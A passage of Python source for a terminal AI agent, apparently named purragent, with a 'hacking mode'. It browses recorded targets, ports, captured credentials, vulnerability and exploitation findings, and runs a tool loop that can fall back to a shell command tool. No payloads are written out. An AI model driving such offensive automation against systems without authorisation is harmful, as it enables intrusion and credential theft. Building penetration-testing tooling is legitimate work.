                pref = ("❯ " if j == 0 else "  ") if role == "user" else ""
                out.append((color, pref + wl))
            out.append(("\x1b[0m", ""))
        return out

    def render(mode, pending=None, typed=""):
        area = rows - 2
        ls = _lines(pending)[-area:]
        ls = [("", "")] * (area - len(ls)) + ls
        buf = ["\x1b[H"]
        for color, text in ls:
            buf.append(f"{color}{text}\x1b[0m\x1b[K\r\n")
        buf.append("\x1b[90m  btw chat · Enter send · Esc exit · "
                   "Ctrl-C stop answer\x1b[0m\x1b[K\r\n")
        if mode == "stream":
            buf.append("\x1b[7m streaming… \x1b[0m\x1b[K")
        else:
            buf.append(f"\x1b[1;36m❯ {typed}\x1b[0m\x1b[K")
        sys.stdout.write("".join(buf))
        sys.stdout.flush()

    def read_line(fd):
        typed: list = []
        render("input", typed="")
        while True:
            try:
                ch = os.read(fd, 1)
            except KeyboardInterrupt:
                return None
            if ch in (b"\r", b"\n"):
                s = "".join(typed).strip()
                if s:
                    return s
                continue
            if ch == b"\x1b":                     # Esc (or an escape sequence)
                seq = b""
                while select.select([fd], [], [], 0.02)[0]:
                    seq += os.read(fd, 8)
                if not seq:
                    return None                    # lone Esc → exit chat
                continue                           # ignore arrows etc. while typing
            if ch in (b"\x7f", b"\x08"):
                if typed:
                    typed.pop()
            elif ch == b"\x03":
                return None
            elif ch >= b" ":
                typed.append(ch.decode("utf-8", "ignore"))
            render("input", typed="".join(typed))

    q = first_question
    with _alt_screen():
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            while q is not None:
                transcript.append(("user", q))
                messages.append({"role": "user", "content": q})
                body = {"model": model, "messages": [_system()] + messages,
                        "temperature": AGENT_TEMPERATURE}
                if custom_params:
                    body.update(custom_params)     # note: no `tools` — tool-free
                answer = {"t": ""}

                def emit(piece, _a=answer):
                    _a["t"] += piece
                    render("stream", pending=_a["t"])

                render("stream", pending="")
                try:
                    _chat_stream(endpoint, api_key, body, emit,
                                 hide_thinking=hide_thinking, render_reasoning=False)
                except (KeyboardInterrupt, SystemExit):
                    answer["t"] += "\n[interrupted]"
                except Exception as e:            # noqa: BLE001
                    answer["t"] += f"\n[error: {e}]"
                transcript.append(("assistant", answer["t"]))
                messages.append({"role": "assistant", "content": answer["t"]})
                q = read_line(fd)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
            termios.tcflush(fd, termios.TCIFLUSH)
    _drain_stdin()


def _box_table_frags(headers: list, rows: list, aligns: list, sel: int,
                     maxw: int = 26) -> list:
    """prompt_toolkit fragments for a pshunter-style box-drawing table with the
    selected row highlighted. `rows` is a list of cell-lists; long cells are
    truncated to `maxw` so the borders stay aligned."""
    n = len(headers)

    def fit(s):
        s = str(s)
        return s if len(s) <= maxw else s[:maxw - 1] + "…"

    grid = [[fit(r[i] if i < len(r) else "") for i in range(n)] for r in rows]
    w = [len(h) for h in headers]
    for r in grid:
        for i in range(n):
            w[i] = max(w[i], len(r[i]))

    def pad(s, i):
        gap = " " * (w[i] - len(s))
        return gap + s if aligns[i] == "r" else s + gap

    ind = "  "

    def rule(left, mid, right):
        return ind + left + mid.join("─" * (w[i] + 2) for i in range(n)) + right + "\n"

    frags = [("class:border", rule("┌", "┬", "┐")),
             ("class:border", ind + "│")]
    for i in range(n):
        frags += [("class:colhdr", f" {pad(headers[i], i)} "), ("class:border", "│")]
    frags += [("", "\n"), ("class:border", rule("├", "┼", "┤"))]
    for ri, r in enumerate(grid):
        cell_cls = "class:sel" if ri == sel else "class:cell"
        frags.append(("class:border", ind + "│"))
        for i in range(n):
            frags += [(cell_cls, f" {pad(r[i], i)} "), ("class:border", "│")]
        frags.append(("", "\n"))
    frags.append(("class:border", rule("└", "┴", "┘")))
    return frags


def _browse(title: str, headers: list, rows: list, aligns: list = None,
            can_add: bool = False, can_delete: bool = False, empty_hint: str = ""):
    """Interactive box-drawing table (pshunter-style) with arrow selection + action
    keys. `headers` are column names; `rows` is a list of cell-lists (one str per
    column); `aligns` is 'l'/'r' per column (default left). Returns a tuple:
    ('open', i) on Enter/→, ('add', None) on 'a' (if can_add), ('del', i) on 'd'
    (if can_delete), or ('back', None) on Esc/q/←. Runs on the alternate screen."""
    n = len(rows)
    aligns = aligns or ["l"] * len(headers)
    idx = [0]
    kb = KeyBindings()

    @kb.add("up")
    @kb.add("c-p")
    def _(_e):
        if n:
            idx[0] = (idx[0] - 1) % n

    @kb.add("down")
    @kb.add("c-n")
    def _(_e):
        if n:
            idx[0] = (idx[0] + 1) % n

    @kb.add("enter")
    @kb.add("right")
    def _(e):
        e.app.exit(result=(("open", idx[0]) if n else ("back", None)))

    if can_add:
        @kb.add("a")
        def _(e):
            e.app.exit(result=("add", None))

    if can_delete:
        @kb.add("d")
        def _(e):
            if n:
                e.app.exit(result=("del", idx[0]))

    @kb.add("escape")
    @kb.add("q")
    @kb.add("left")
    @kb.add("c-c")
    def _(e):
        e.app.exit(result=("back", None))

    def render():
        frags = [("class:title", f"  {title}\n\n")]
        if not rows:
            frags.append(("class:hint", f"  {empty_hint or '(empty)'}\n"))
        else:
            frags += _box_table_frags(headers, rows, aligns, idx[0])
        keys = ["↑/↓ move", "enter open"]
        if can_add:
            keys.append("a add")
        if can_delete:
            keys.append("d delete")
        keys.append("esc back")
        frags.append(("class:footer", "\n  " + " · ".join(keys)))
        return frags

    control = FormattedTextControl(render, show_cursor=False)
    style = Style.from_dict({
        "title": "bold", "sel": "bold #d75fff", "cell": "", "border": "#585858",
        "hint": "#7f7f7f", "footer": "#7f7f7f italic", "colhdr": "#7f7f7f bold",
    })
    app = Application(layout=Layout(Window(control, style="class:cell")),
                      key_bindings=kb, style=style, full_screen=False,
                      mouse_support=False)
    _drain_stdin()   # discard stray input from a preceding add/remove prompt
    with _alt_screen():
        result = app.run()
    _drain_stdin()
    return result if result is not None else ("back", None)


def _host_label(h: dict) -> str:
    return (h.get("ip") or h.get("hostname") or h.get("url") or h.get("domain")
            or h.get("label") or "(unknown host)")


def _add_service(base_dir: str, target_id: int) -> None:
    """[a] on a host — manually add a port/service (pshunter-style). Runs on its own
    alternate screen so it stays inside /target instead of dropping to the REPL."""
    with _alt_screen():
        sys.stdout.write("\x1b[2J\x1b[H")
        sys.stdout.flush()
        console.print(Text("  add port / service", style=f"bold {VIOLET}"))
        console.print()
        try:
            port = int(input("  port: ").strip())
        except (EOFError, KeyboardInterrupt, ValueError):
            return
        proto = (input("  proto [tcp]: ").strip() or "tcp")
        service = input("  service (e.g. http, ssh): ").strip()
        product = input("  product [blank]: ").strip()
        version = input("  version [blank]: ").strip()
        try:
            purragent_db.add_service(base_dir, target_id, port, proto,
                                     service, product, version)
        except Exception as e:
            console.print(f"  [red]could not add:[/red] [dim]{e}[/dim]")
            input("  press Enter to continue…")


def _del_service(base_dir: str, port: dict) -> None:
    """[d] on a port — remove it after a confirm. On its own alternate screen so it
    stays inside /target instead of dropping to the REPL."""
    lbl = f"{port['port']}/{port.get('proto') or 'tcp'}"
    with _alt_screen():
        sys.stdout.write("\x1b[2J\x1b[H")
        sys.stdout.flush()
        try:
            ans = input(f"  delete {lbl}? [y/N] ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            ans = ""
    if ans in ("y", "yes"):
        purragent_db.remove_port(base_dir, port["id"])


def _del_host(base_dir: str, host: dict) -> bool:
    """[d] on a host — delete the whole target after a confirm. Returns True if it
    was removed. On its own alternate screen so it stays inside /target."""
    lbl = _host_label(host)
    with _alt_screen():
        sys.stdout.write("\x1b[2J\x1b[H")
        sys.stdout.flush()
        try:
            ans = input(f"  delete target {lbl} and all its data? [y/N] "
                        ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            ans = ""
    if ans in ("y", "yes"):
        purragent_db.remove_engagement(base_dir, host.get("engagement_id"))
        return True
    return False


def _port_view(base_dir: str, host: dict, port: dict) -> None:
    """Detail for one port/service + the target's findings (creds/endpoints/notes)."""
    f = purragent_db.fetch_findings(base_dir, host["id"], host.get("engagement_id"))
    parts = [Text(f"{_host_label(host)}  ·  {port['port']}/{port.get('proto') or 'tcp'}",
                  style=f"bold {VIOLET}"), Text("")]
    svc = [f"{k}={port[k]}" for k in ("service", "product", "version") if port.get(k)]
    parts.append(Text("  service: " + ("  ".join(svc) if svc else "(unknown)"),
                      style="bright_black"))
    scripts = purragent_db.fetch_scripts(base_dir, host["id"], port["port"])
    pnum = port["port"]
    vulns_here = [v for v in f.get("vulns", []) if v.get("port") == pnum]
    phase3 = [v for v in vulns_here if v.get("script") != "cve-lookup"]   # vuln scan
    cvef = [v for v in vulns_here if v.get("script") == "cve-lookup"]     # CVE lookup
    exploits = [e for e in f.get("exploit_findings", []) if e.get("port") == pnum]
    _riskcol = {"CRITICAL": "bright_red", "HIGH": "red", "MEDIUM": "yellow",
                "LOW": "bright_black", "INFO": "bright_black"}
    parts += [Text(""), Text("  findings", style="bold")]
    creds, eps, notes = f["credentials"], f["endpoints"], f["notes"]
    for c in creds:
        parts.append(Text(f"    ! {c.get('username') or ''}:{c.get('secret') or ''}"
                          + (f" ({c['secret_type']})" if c.get("secret_type") else "")
                          + (f" @ {c['scope']}" if c.get("scope") else ""),
                          style="bright_black"))
    for ep in eps:
        parts.append(Text(f"    {ep.get('method') or 'GET'} {ep.get('url')}",
                          style="bright_black"))
    for sc in scripts:                            # NSE (-sC) output from phase 2
        parts.append(Text(f"    ⋔ {sc.get('script')}", style="bright_black"))
        for oln in (sc.get("output") or "").splitlines():
            oln = oln.rstrip()
            if oln.strip():
                parts.append(Text("        " + oln, style="bright_black"))
    for v in phase3:                              # phase 3 — vuln scan findings
        risk = (v.get("risk") or "").upper()
        line = Text("    ⚠ ", style="red")
        line.append(v.get("summary") or v.get("script") or "", style="default")
        if risk:
            line.append(f"  [{risk}]", style=_riskcol.get(risk, "bright_black"))
        if v.get("cve"):
            line.append("  " + v["cve"], style="bright_black")
        parts.append(line)
    for v in cvef:                                # phase 4 — CVE lookup
        parts.append(Text(f"    ⌕ {v.get('summary') or 'CVE lookup'}",
                          style="bright_black"))
        ids = (v.get("cve") or "").split(",") if v.get("cve") else []
        if ids:
            shown = ", ".join(ids[:12]) + (f"  (+{len(ids) - 12} more)"
                                           if len(ids) > 12 else "")
            parts.append(Text("        " + shown, style="bright_black"))
    for e in exploits:                            # phase 5 — service exploitation
        parts.append(Text(f"    ⚑ {e.get('step') or e.get('service') or 'exploit'}",
                          style="green"))
        for ln in (e.get("finding") or "").splitlines():
            if ln.strip():
                parts.append(Text("        " + ln.rstrip(), style="green"))
    for nt in notes:
        txt = " ".join((nt.get("text") or "").split())
        if len(txt) > 100:
            txt = txt[:100] + "…"
        parts.append(Text(f"    · {nt.get('kind')}: {txt}", style="bright_black"))
    if not (creds or eps or notes or scripts or phase3 or cvef or exploits):
        parts.append(Text("    (none yet)", style="bright_black"))
    parts += [Text(""), Text("q to return", style="bright_black")]
    show_view(_render_ansi(Group(*parts)), hint="port detail · q to return")


def _host_view(base_dir: str, host: dict) -> None:
    """Ports/services for one host, with [a] add and [d] delete; Enter drills into
    a port's detail + findings."""
    tid, label = host["id"], _host_label(host)
    headers = ["PORT", "PROTO", "SERVICE", "PRODUCT", "VERSION"]
    aligns = ["r", "l", "l", "l", "l"]
    while True:
        ports = purragent_db.fetch_ports(base_dir, tid)
        rows = [[str(p["port"]), p.get("proto") or "tcp", p.get("service") or "-",
                 p.get("product") or "-", p.get("version") or "-"]
                for p in ports]
        act, i = _browse(f"{label} — ports & services", headers, rows, aligns=aligns,
                         can_add=True, can_delete=True,
                         empty_hint="no ports yet — press a to add one")
        if act == "back":
            return
        if act == "open" and ports:
            _port_view(base_dir, host, ports[i])
        elif act == "add":
            _add_service(base_dir, tid)
        elif act == "del" and ports:
            _del_service(base_dir, ports[i])


def _db_view(base_dir: str) -> bool:
    """/target — interactive browser of the hacking-mode DB (pshunter-style): a
    hosts table → a host's ports/services → a port's detail + findings, with manual
    add/remove of services and deletion of a whole target. Returns True if the last
    target was deleted (the caller then re-asks for a target IP)."""
    while True:
        try:
            hosts = purragent_db.fetch_hosts(base_dir)
        except Exception as e:
            console.print(f"  [red]could not read the target database:[/red] "
                          f"[dim]{e}[/dim]")
            return False
        if not hosts:
            console.print("  [dim]no targets recorded yet — enable hacking mode "
                          "with[/dim] [cyan]/hack[/cyan]")
            return False
        headers = ["IP", "MAC", "VENDOR", "HOSTNAME", "OS", "PORTS"]
        aligns = ["l", "l", "l", "l", "l", "r"]
        rows = [[h.get("ip") or "-", h.get("mac") or "-", h.get("vendor") or "-",
                 h.get("hostname") or "-", h.get("os") or "-", str(h["n_ports"])]
                for h in hosts]
        act, i = _browse("Target database — hosts", headers, rows, aligns=aligns,
                         can_delete=True, empty_hint="no hosts")
        if act == "back":
            return False
        if act == "open":
            _host_view(base_dir, hosts[i])
        elif act == "del":
            if _del_host(base_dir, hosts[i]) and not purragent_db.fetch_hosts(base_dir):
                return True          # deleted the last target → caller re-asks for IP


# ── Conversation summarisation (keep the window within its % budget) ──────────
# When the verbatim history grows past its share of the pool (pool − summary cap), the
# oldest turns that spill over are folded into a rolling summary by one LLM call, and
# dropped from the live history. The summary is injected as a system block and capped at
# the summarised slot, so recent + summary never push past the budget.
_SUMMARY_SYSTEM = (
    "You maintain a running summary of a conversation so its older turns can be dropped "
    "without losing context. Merge the EXISTING SUMMARY with the OLDER TURNS below into "
    "ONE concise summary. Preserve: decisions made, facts/data established, the user's "
    "stated preferences and standing instructions, unfinished threads and open "
    "questions, and important names/paths/values. Drop small talk and redundancy. Write "
    "compact notes (third person, no preamble, no meta-comments).")


def _summarize_turns(profile: dict, base_dir: str, existing: str, turns: list,
                     cap_chars: int):
    """Fold `turns` (and the existing summary) into an updated summary via one tool-free
    LLM call, hard-capped at cap_chars. Returns None on failure/empty (caller then keeps
    the old summary and history, and retries next turn) so context is never lost."""
    convo = "\n".join(f"{m.get('role', '?')}: {m.get('content', '')}" for m in turns
                      if isinstance(m.get("content"), str) and m.get("content").strip())
    if not convo.strip():
        return None
    words = max(120, cap_chars // 6)
    user = ("EXISTING SUMMARY:\n" + (existing or "(none)")
            + "\n\nOLDER TURNS to fold in:\n" + convo
            + f"\n\nReturn the updated summary (under ~{words} words).")
    body = {"model": profile.get("model", ""),
            "messages": [{"role": "system", "content": _SUMMARY_SYSTEM},
                         {"role": "user", "content": user}],
            "temperature": AGENT_TEMPERATURE}
    custom = psai._parse_custom_params(profile)
    if custom:
        body.update(custom)
    try:
        endpoint, api_key = _openai_endpoint(profile, base_dir)
        parts: list = []
        _chat_stream(endpoint, api_key, body, lambda t: parts.append(t),
                     hide_thinking=True, render_reasoning=False,
                     max_seconds=AGENT_TURN_MAX_SECONDS)
    except Exception:                                  # noqa: BLE001
        return None
    out = "".join(parts).strip()
    return out[:cap_chars] if out else None


def _maybe_summarize(profile: dict, base_dir: str, ctx: dict, mcp, mode: str,
                     history: list) -> None:
    """Keep the verbatim history within its budget: summarise + drop the oldest turns
    that overflow. Mutates `history` in place and updates ctx['summary']. No-op without a
    model, in plan mode, or when the window is unknown / the history still fits."""
    if not profile or mode == "plan":
        return
    budget = _conv_budget(profile, base_dir, ctx, mcp, mode)
    if budget is None:
        return
    recent_budget, summ_cap = budget
    if recent_budget <= 0:
        return
    hist_chars = sum(len(m.get("content") or "") for m in history
                     if isinstance(m.get("content"), str))
    if hist_chars <= recent_budget:
        return                                         # verbatim history still fits
    # Keep the newest turns that fit recent_budget; the older ones overflow.
    total, keep_from = 0, len(history)
    for i in range(len(history) - 1, -1, -1):
        c = len(history[i].get("content") or "") \
            if isinstance(history[i].get("content"), str) else 0
        if total + c > recent_budget and i < len(history) - 1:
            break                                      # always keep at least the last turn
        total += c
        keep_from = i
    overflow = history[:keep_from]
    if not overflow:
        return
    new_summary = _summarize_turns(profile, base_dir, ctx.get("summary", ""),
                                   overflow, summ_cap)
    if new_summary:
        ctx["summary"] = new_summary
        history[:] = history[keep_from:]               # drop the summarised turns
        console.print(Text(f"  ▸ condensed {len(overflow)} older turn(s) into the "
                           "summary (keeping the window in budget)",
                           style="bright_black"))


def query_model_with_tools(profile: dict, base_dir: str, history: list,
                           mcp: "mcp_client.MCPManager", on_event, on_text,
                           mode: str = "auto", on_confirm=None,
                           offer_hack: bool = False, on_hack=None,
                           summary: str = "") -> str:
    """Run the agent loop and return the model's final text answer.

    `on_event(kind, name, payload)` reports progress: kind is 'call' (payload is
    the arguments dict), 'result' (payload is the MCP result dict), or 'search'
    (a request_tool discovery — payload is {'need', 'hits'}).
    `on_text(piece)` receives streamed answer chunks as they arrive (the final
    answer is streamed live, so the caller should not print the return value).
    `mode` is the run mode: 'plan' (no tools, just plan), 'auto', 'confirm', or
    'semi-auto'. `on_confirm(name, args, reason) -> bool` is asked before a tool
    call the mode flags as needing approval; returning False skips it.
    `offer_hack` adds the enable_hacking_mode tool (only when hacking is off); if
    the model calls it with enable=true, `on_hack()` is invoked and the turn ends
    so the caller can run the /hack flow.
    """
    planning = (mode == "plan")
    provider = profile.get("provider", "ollama")
    model    = profile.get("model", "")
    endpoint, api_key = _openai_endpoint(profile, base_dir)
    temperature   = AGENT_TEMPERATURE      # pinned; not inherited from the profile
    custom_params = psai._parse_custom_params(profile)
    custom_system = profile.get("custom_system", "").strip()
    hide_thinking = bool(profile.get("hide_thinking", False))

    # Only offer tools that can actually run here — a tool whose program/library isn't
    # installed would only return '[not installed]' and waste the call.
    all_tools = [t for t in mcp.all_tools() if _tool_available(t)]
    retriever = _get_retriever(base_dir, all_tools)
    discovery = retriever is not None      # False → fall back to sending all schemas

    sys_parts = [PURRAGENT_SYSTEM, _env_block()]
    if planning:
        sys_parts.append(PLAN_MODE_NOTE)
    elif discovery:
        sys_parts += [_DISCOVERY_GUIDE, _catalog_block(all_tools)]
    if offer_hack and not planning:
        sys_parts.append(_HACK_TRIGGER_GUIDE)
    mem_block = _memory_block(base_dir)                 # remembered instructions + facts
    if mem_block:
        sys_parts.append(mem_block)
    if summary:                                         # condensed older conversation
        sys_parts.append("EARLIER CONVERSATION SUMMARY (older turns, condensed):\n"
                         + summary)
    if custom_system:
        sys_parts.append(custom_system)
    offer_save = not planning              # always available (except in plan mode)
    if offer_save:
        sys_parts.append(_MEMORY_GUIDE)    # nudge weaker models to actually save
    # Local working copy of the transcript: the raw assistant tool-call messages
    # and tool results live only here, not in the caller's plain history.
    msgs = [{"role": "system", "content": "\n\n".join(sys_parts)}] + list(history)

    # Accumulating set of full schemas the model may call. In discovery mode it
    # starts empty and grows as request_tool surfaces tools; in fallback mode it
    # holds every tool up front (classic behaviour).
    active: dict = {} if discovery else {t["name"]: t["schema"] for t in all_tools}
    discovery_rounds = 0
    trimmer = _StreamTrimmer(on_text)   # swallow the blank lines around tool calls
    # The universal escape hatch, handed over only when a discovery round finds
    # nothing — so the model still prefers the safer specialised tools, but is
    # never stranded when RAG can't match its need.
    run_cmd = next((t for t in all_tools
                    if mcp_client.split_namespaced(t["name"])[1] == "run_command"),
                   None)

    for _round in range(TOOL_LOOP_MAX_ROUNDS):
        offer_meta = (not planning and discovery
                      and discovery_rounds < DISCOVERY_MAX_ROUNDS)
        tools_field = ([] if planning
                       else ([_META_TOOL] if offer_meta else [])
                       + ([_ENABLE_HACK_TOOL] if offer_hack else [])
                       + ([_SAVE_MEMORY_TOOL] if offer_save else [])
                       + list(active.values()))

        body = {"model": model, "messages": msgs}
        if tools_field:
            body["tools"] = tools_field
            body["tool_choice"] = "auto"
        if temperature is not None:
            body["temperature"] = temperature
        if custom_params:
            body.update(custom_params)

        message = _chat_stream(endpoint, api_key, body, trimmer.feed, hide_thinking)

        tool_calls = message.get("tool_calls") or []
        if not tool_calls:
            return (message.get("content") or "").strip()

        # A tool-call turn — discard its trailing whitespace so no blank lines
        # land between the streamed text and the tool-activity lines.
        trimmer.end_turn()
        # Keep the assistant's tool-call turn in context, then answer each call.
        msgs.append(message)
        for tc in tool_calls:
            fn   = tc.get("function", {})
            name = fn.get("name", "")
            call_id = tc.get("id")
            try:
                args = json.loads(fn.get("arguments") or "{}")
            except json.JSONDecodeError:
                args = {}

            if name == META_TOOL_NAME:
                # Discovery: retrieve tools matching the described need and add
                # their schemas to the active set (poprawka 1 — they persist).
                need = (args.get("need") or args.get("description") or "").strip()
                hits = retriever.retrieve(need, RETRIEVE_TOP_N) if retriever else []
                surfaced = []
                for hname, _score in hits:
                    if hname not in active:
                        schema = mcp.schema_for(hname)
                        if schema is not None:
                            active[hname] = schema
                    surfaced.append(mcp_client.split_namespaced(hname)[1])
                # Nothing matched — surface run_command as a fallback so the model
                # can still act (via a shell command) instead of getting stuck.
                if not surfaced and run_cmd is not None:
                    if run_cmd["name"] not in active:
                        active[run_cmd["name"]] = run_cmd["schema"]
                    surfaced.append("run_command")
                # Bound the context: drop the oldest schemas past the cap.
                while len(active) > MAX_ACTIVE_TOOLS:
                    active.pop(next(iter(active)))
                discovery_rounds += 1
                on_event("search", need, {"hits": surfaced})
                if surfaced:
                    ack = ("Matching tools now available to call: "
                           + ", ".join(surfaced) + ". Call one if it fits, or "
                           "call request_tool again to refine.")
                else:
                    ack = ("No matching tools were found. Try describing the need "
                           "differently, or answer without a tool.")
                msgs.append({"role": "tool", "tool_call_id": call_id,
                             "content": ack})
                continue

            if name == SAVE_MEMORY_TOOL_NAME:
                text = str(args.get("text") or "").strip()
                action = str(args.get("action") or "save").strip().lower()
                on_event("call", name, {"action": action, "text": text})
                # Acks steer the model to STOP — weak models otherwise re-save / delete /
                # re-save in a loop (the normal tool loop has no dedup).
                if action == "delete":
                    removed = _delete_memory(base_dir, text) if text else []
                    ack = (f"Forgot {len(removed)} memory item(s). Done — do not call "
                           "save_memory again." if removed else
                           "Nothing matched to forget. Do not retry.")
                else:
                    kind = str(args.get("kind") or "fact").strip().lower()
                    saved = _add_memory(base_dir, text, kind) if text else False
                    ack = ("Saved. It is stored and applies automatically from now on — "
                           "do NOT call save_memory again for this." if saved else
                           "Already stored — nothing to do. Do NOT save or delete it; "
                           "just continue answering.")
                on_event("result", name, {"text": ack})
                msgs.append({"role": "tool", "tool_call_id": call_id, "content": ack})
                continue

            if name == ENABLE_HACK_TOOL_NAME:
                # Model proposes hacking mode. Hand control to the /hack flow (same
                # as if the user typed /hack): signal the caller and end the turn —
                # the REPL then runs the confirm + announcement. enable=false (or no
                # handler) is a no-op the model can keep going from.
                if bool(args.get("enable")) and on_hack is not None:
                    on_hack()
                    return (message.get("content") or "").strip()
                msgs.append({"role": "tool", "tool_call_id": call_id,
                             "content": "Hacking mode was not enabled."})
                continue

            # Robustness: some models ignore request_tool and fabricate a call
            # using a catalog line (the tool's description) or an undiscovered
            # name. Routing that straight to mcp.call fails cryptically ("no such
            # MCP server: None"), which models then misread as a server outage.
            if name not in active:
                resolved = _resolve_tool_name(name, all_tools)
                if resolved is None:
                    on_event("result", name, {"text": f"unknown tool: {name}",
                                              "is_error": True})
                    msgs.append({"role": "tool", "tool_call_id": call_id,
                                 "content": (
                                     f"No tool named '{name}' exists. Tools are not "
                                     "called by their description. Call request_tool "
                                     "with what you need, then call the tool by the "
                                     "exact name provided.")})
                    continue
                if resolved not in active:
                    active[resolved] = mcp.schema_for(resolved)
                    while len(active) > MAX_ACTIVE_TOOLS:
                        active.pop(next(iter(active)))
                bare = mcp_client.split_namespaced(resolved)[1]
                if name in (resolved, bare):
                    name = resolved          # real name, loose form — run it below
                else:
                    # Called by description: the arguments are likely fabricated
                    # too, so surface the real tool and ask for a clean retry.
                    on_event("search", name, {"hits": [bare]})
                    msgs.append({"role": "tool", "tool_call_id": call_id,
                                 "content": (
                                     f"'{name}' is not a callable tool name. The tool "
                                     f"you want is now available as '{resolved}'. Call "
                                     "it using that exact name and only its declared "
                                     "parameters (do not invent argument names).")})
                    continue

            # Run-mode gate: ask the user before flagged calls (confirm / semi-auto).
            need, reason = _needs_confirm(mode, name, args)
            if need and on_confirm is not None and not on_confirm(name, args, reason):
                msgs.append({
                    "role": "tool", "tool_call_id": call_id,
                    "content": ("The user declined to run this action. Do not retry "
                                "it as-is; propose an alternative or ask the user how "
                                "to proceed."),
                })
                continue

            on_event("call", name, args)
            result = mcp.call(name, args)
            on_event("result", name, result)
            msgs.append({
                "role": "tool",
                "tool_call_id": call_id,
                "content": result.get("text") or "(no output)",
            })

    return "[tool loop] stopped: reached the tool-call limit without a final answer."


# ── History (↑ recalls your prompts, not slash commands) ───────────────────────

class PromptHistory(InMemoryHistory):
    """In-session history that omits slash commands: pressing ↑ walks back through
    the messages you sent the model, not /model, /help, /greeting, etc."""

    def append_string(self, string: str) -> None:
        if string.lstrip().startswith("/"):
            return
        super().append_string(string)


# ── Slash completer (arrow-navigable dropdown) ─────────────────────────────────

class SlashCompleter(Completer):
    def __init__(self, servers_provider=None, extra_provider=None):
        # Callable returning [(name, enabled)] for non-built-in MCP servers, for
        # completing "/mcp <enable|disable|remove> <name>". Defaults to none.
        self._servers = servers_provider or (lambda: [])
        # Callable returning extra [(cmd, hint)] shown only in some state (e.g.
        # /start while hacking mode is on). Defaults to none.
        self._extra = extra_provider or (lambda: [])

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        if not text.startswith("/"):
            return
        parts = text.split(" ")
        # Third slot: "/mcp <enable|disable|remove> <partial>" → server names,
        # filtered by what makes sense (enable→disabled, disable→enabled).
        if (len(parts) == 3 and parts[0].lower() == "/mcp"
                and parts[1].lower() in _MCP_NAME_SUBS):
            sub, word = parts[1].lower(), parts[2]
            items = self._servers()
            if sub == "enable":
                names = [n for n, en in items if not en]
            elif sub == "disable":
                names = [n for n, en in items if en]
            else:                                     # remove
                names = [n for n, _ in items]
            for name in names:
                if name.startswith(word):
                    yield Completion(name, start_position=-len(word),
                                     display=name, display_meta="MCP server")
            return
        if len(parts) >= 2:
            # Completing a subcommand: "/<cmd> <partial>" (only the first slot).
            subs = SLASH_SUBCOMMANDS.get(parts[0].lower())
            if subs and len(parts) == 2:
                word = parts[1]
                for sub, hint in subs:
                    if sub.startswith(word):
                        yield Completion(sub, start_position=-len(word),
                                         display=sub, display_meta=hint)
            return
        for cmd, hint in list(SLASH) + list(self._extra()):
            if cmd.startswith(text):
                yield Completion(cmd, start_position=-len(text),
                                 display=cmd, display_meta=hint)


# ── REPL ───────────────────────────────────────────────────────────────────────

def run_repl(base_dir: str, config: dict, profile: dict | None) -> None:
    ctx = {"profile": profile, "max_context": None}   # max_context: session override
    # The engagement store is session-ephemeral (holds credentials): wipe any DB
    # left over from a previous (possibly crashed) session so we always start clean.
    purragent_db.reset(base_dir)
    history: list = []
    _state = _load_state(base_dir)
    greeting = _state.get("greeting") or DEFAULT_GREETING
    mode = _state.get("mode") or DEFAULT_MODE   # skeleton: inert
    debug = False   # /debug: mirror pschat's --debug (dump the request to the model)
    hack_mode = False   # /hack: hacking mode on → shows in the toolbar; /hack again disables
    hack_goal = None    # /hack: chosen objective shortcode (flag/privesc/vuln/access)

    # First-ever launch: greet without "back". Mark it so later launches say "back".
    first_launch = not _state.get("launched")
    if first_launch:
        _save_state(base_dir, launched=True)

    # MCP client. Servers are spawned lazily on first use (chat or /mcp) so
    # launching purragent stays fast and costs nothing when MCP is unused.
    mcp = mcp_client.MCPManager(base_dir)
    ctx["mcp"] = mcp        # so the hacking pipeline's phase-4.5 review can call tools

    def ensure_mcp() -> None:
        if not mcp.connected:
            mcp.connect()

    # Connect up front (cheap: stdio spawn + cached HTTP tools, no network) so
    # /context, model capabilities and the tool loop all reflect the enabled MCP
    # servers immediately — without needing a first prompt or opening /mcp.
    ensure_mcp()

    def _toolbar_inner():
        p = ctx["profile"]
        mode_seg = f"<style fg='#b46cff'>mode: {mode}</style>"
        # Privilege indicator: red 'root' warns you're elevated, dim 'user' otherwise.
        priv_seg = ("<style fg='#ff5f5f'>⚡ root</style>" if _is_root()
                    else "<style fg='#7f7f7f'>user</style>")
        # Only shown while /debug is on, so you always know the request is dumped.
        dbg_seg = "   <style fg='#e5c07b'>debug</style>" if debug else ""
        # Active offensive engagement — shown while hacking mode is on (/hack), with
        # the chosen objective shortcode (flag/privesc/vuln/access).
        hack_seg = ""
        if hack_mode:
            goal_txt = f" · {hack_goal}" if hack_goal else ""
            hack_seg = f"   <style fg='#ff5f5f'>⚑ hacking{goal_txt}</style>"
        # Background progress indicator: how many commands are running now, or
        # 'thinking' while the model analyses output, or 'working' in a brief gap —
        # so the bar never looks idle before 'automated recon complete'. /status
        # shows the detail. (concurrent in phases 1–3, one at a time in phase 5.)
        running = sum(1 for ph in ctx.get("phases", [])
                      for j in ph.get("jobs", []) if j.get("state") == "running")
        eng_ = ctx.get("engagement") or {}
        active = (ctx.get("hacking") and not eng_.get("recon_done")
                  and not eng_.get("cancelled"))
        if running:
            scan_seg = f"   <style fg='#e5c07b'>⟳ {running} running</style>"
        elif active and eng_.get("thinking"):
            scan_seg = "   <style fg='#e5c07b'>⟳ thinking…</style>"
        elif active:
            scan_seg = "   <style fg='#e5c07b'>⟳ working…</style>"
        else:
            scan_seg = ""
        if not p:
            return HTML("  <style fg='#e5c07b'>no model</style> — type "
                        "<style fg='#61afef'>/model</style> to choose   "
                        f"{mode_seg}   {priv_seg}{dbg_seg}{hack_seg}{scan_seg}   "
                        "<style fg='#7f7f7f'>/exit to quit</style>")
        # Capability badges — shown only when the attached model supports them.
        caps = [c for c in ("vision", "audio")
                if _model_capability(p, base_dir, c)]
        cap_seg = ("   " + " ".join(f"<style fg='#56b6c2'>{c}</style>" for c in caps)
                   if caps else "")
        # Context window the model advertises; a trailing '*' means a session
        # override is in effect (set with /setcontext).
        maxc = _effective_max_context(ctx, base_dir)
        ctx_seg = ""
        if maxc:
            star = "*" if ctx.get("max_context") else ""
